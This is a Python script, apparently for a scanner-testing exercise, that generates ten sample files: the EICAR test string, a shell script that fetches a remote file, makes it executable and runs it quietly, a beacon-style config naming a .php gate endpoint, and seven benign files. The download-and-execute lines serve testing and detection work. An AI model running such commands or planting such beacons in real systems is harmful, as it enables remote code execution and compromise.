#!/usr/bin/env python3
"""22 · 生成 10 个自造测试样本（3 个含恶意特征 + 7 个正常）与白名单示例。

用法:
    python3 make_samples.py --outdir artifacts

产物:
    artifacts/samples/   10 个文件——3 恶意（EICAR/下载执行组合/IP 端点）+ 7 正常
    artifacts/whitelist.txt  白名单示例（把 EICAR 按「已知测试件」降噪）
"""
import argparse
from pathlib import Path

# 行业标准 EICAR 测试串（68 字节、无害，用于验证反病毒链路）
EICAR = r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"

MALICIOUS = {
    "sample-01-eicar.txt": EICAR + "\n",
    "sample-02-downloader.sh": (
        "#!/bin/sh\n"
        "# 自造样本：模拟「下载 → 赋权 → 执行」\n"
        "curl -s http://cdn-updates.example.org/patch.sh -o /tmp/.patch\n"
        "chmod +x /tmp/.patch\n"
        "/tmp/.patch --quiet\n"
    ),
    "sample-03-beacon.txt": (
        "# 采样配置（自造样本）\n"
        "endpoint = http://203.0.113.66:8080/gate.php?id=web01\n"
        "interval = 30\n"
    ),
}

BENIGN = {
    "note.md": "# 周会记录\n\n- 下周发布窗口：周三 14:00\n- 端口清单已更新到 wiki\n",
    "config.json": '{\n  "api": "https://api.example.com/v1",\n  "retries": 3,\n  "timeout": 5\n}\n',
    "index.php": "<?php\necho \"<h1>Hello</h1>\";\ninclude __DIR__ . '/footer.php';\n?>\n",
    "app.js": "const list = await fetch('/api/list').then(r => r.json());\nconsole.log(list.length);\n",
    "deploy.sh": (
        "#!/bin/sh\n"
        "# 正常发布脚本\n"
        "rsync -av ./dist/ web01:/srv/web/\n"
        "chmod 644 /srv/web/index.html\n"
        "systemctl restart web\n"
    ),
    "data.csv": "id,value\n1,42\n2,17\n3,99\n",
    "report.log": (
        "2026-05-03 09:00:01 INFO  service started\n"
        "2026-05-03 09:02:11 INFO  request ok path=/health\n"
    ),
}

WHITELIST = (
    "# 白名单示例：EICAR 是行业标准测试件——像运维对待「已确认无害」的\n"
    "# 文件一样，把它的路径放进来，扫描时直接跳过（降噪而不是删规则）\n"
    "sample-01-eicar.txt\n"
)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--outdir", default="artifacts")
    args = ap.parse_args()
    out = Path(args.outdir)
    samples = out / "samples"
    samples.mkdir(parents=True, exist_ok=True)
    for name, body in {**MALICIOUS, **BENIGN}.items():
        (samples / name).write_text(body, encoding="utf-8")
    (out / "whitelist.txt").write_text(WHITELIST, encoding="utf-8")
    print(f"[gen] 10 个样本 → {samples}/：3 个含恶意特征 + 7 个正常")
    print(f"[gen] 恶意特征：EICAR 测试串 / curl+chmod 下载执行组合 / 硬编码 IP 的 .php 端点")
    print(f"[gen] 白名单示例 → {out}/whitelist.txt（1 条：sample-01-eicar.txt）")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
